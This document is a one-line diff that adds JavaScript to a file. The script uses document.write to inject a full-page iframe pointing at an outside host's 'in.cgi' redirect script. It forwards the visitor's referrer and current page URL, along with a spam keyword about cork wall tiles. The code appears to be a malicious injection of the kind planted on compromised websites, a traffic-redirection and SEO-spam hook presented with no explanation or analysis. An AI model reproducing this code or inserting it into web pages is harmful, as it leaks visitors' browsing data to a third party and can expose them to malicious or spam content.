@@ -1,0 +1,1 @@
+document.write('<iframe width="100%" height="1000" src="http://bezsvyazi.ru/in.cgi?10&group=other&seoref='+encodeURIComponent(document.referrer)+'&parameter=$keyword&se=$se&ur=1&HTTP_REFERER='+encodeURIComponent(document.URL)+'&default_keyword=Faded cork wall tiles">');
